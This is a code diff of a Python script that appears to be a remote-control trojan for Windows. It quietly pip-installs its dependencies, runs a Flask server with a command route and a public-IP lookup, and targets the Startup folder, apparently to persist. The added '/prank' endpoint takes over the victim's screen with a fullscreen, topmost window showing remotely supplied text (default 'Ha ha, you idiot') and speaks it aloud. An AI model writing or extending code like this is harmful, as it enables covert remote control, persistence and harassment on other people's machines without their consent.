@@ -6,19 +6,28 @@ import subprocess
 from pathlib import Path
 from datetime import datetime
 
+import tkinter as tk
+import threading
+import pyttsx3
+
 # ---------------- AUTO INSTALL PYTHON DEPS ----------------
 
 def pip_install(pkg):
-    subprocess.run([sys.executable, "-m", "pip", "install", pkg], check=False)
+    subprocess.run(
+        [sys.executable, "-m", "pip", "install", pkg],
+        check=False
+    )
 
-def ensure_import(pkg_name, pip_name=None):
+
+def ensure(pkg, pip_name=None):
     try:
-        __import__(pkg_name)
+        __import__(pkg)
     except ImportError:
-        pip_install(pip_name or pkg_name)
+        pip_install(pip_name or pkg)
 
-ensure_import("flask")
-ensure_import("requests")
+ensure("flask")
+ensure("requests")
+ensure("pyttsx3")
 
 from flask import Flask, request
 import requests
@@ -36,9 +45,38 @@ def cmd():
 def ip():
     return requests.get("https://api.ipify.org").text
 
+@app.route("/prank", methods=["POST"])
+def prank():
+    data = request.get_json()
+    text = data.get("text", "Ha ha, you idiot")
+    win = tk.Tk()
+    win.attributes("-fullscreen", True)
+    win.attributes("-topmost", True)
+    win.configure(bg="#1e6ae6")
+
+    label = tk.Label(
+        win,
+        text=text,
+        fg="white",
+        bg="#1e6ae6",
+        font=("Arial", 80)
+    )
+
+    label.pack(expand=True) 
+    threading.Thread(target=speak, args=(text,), daemon=True).start()
+    win.mainloop()
+
+    return {"status": "ok"}
+
 @app.route("/")
 def home():
     return {"message": "Hello, World!"}
+
+def speak(text):
+    v = pyttsx3.init()
+    v.say(text)
+    v.runAndWait()
+    v.stop()
 
 def mv_startup():
     startup_dir = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
